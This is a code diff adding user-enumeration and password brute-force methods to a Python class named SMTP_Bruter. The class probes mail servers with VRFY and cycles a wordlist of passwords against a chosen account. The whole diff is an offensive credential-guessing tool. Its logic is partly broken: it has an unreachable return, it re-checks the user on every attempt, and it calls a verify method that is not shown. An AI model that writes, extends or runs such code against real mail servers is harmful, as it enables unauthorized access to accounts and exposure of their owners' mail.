@@ -46,3 +46,31 @@ class SMTP_Bruter(object):
         with open(usernameslist, 'r') as f:
             return f.readlines()
     
+    def verify_user(self, user):
+        try:
+            smtp = SMTP(self.host, self.port)
+            code, fulladdr = smtp.verify(user)
+            if code == 250:
+                print ('[+] User: %s is valid' % user)
+                print ('[+] Full Address: %s' % fulladdr)
+                return True
+            else:
+                return False
+            return True
+        except Exception as e:
+            return False
+
+    def brute_force(self, user, wordlist):
+        for pwd in wordlist:
+            pwd = pwd.strip('\n')
+            if self.verify_user(user):
+                if self.verify(user, pwd):
+                    print ('[+] User: %s Password: %s' % (user, pwd))
+                    return True
+                else:
+                    print ('[-] User: %s Password is not: %s' % (user, pwd))
+                    
+            else:
+                print ('[-] User: %s is not valid' % user)
+                
+        return False
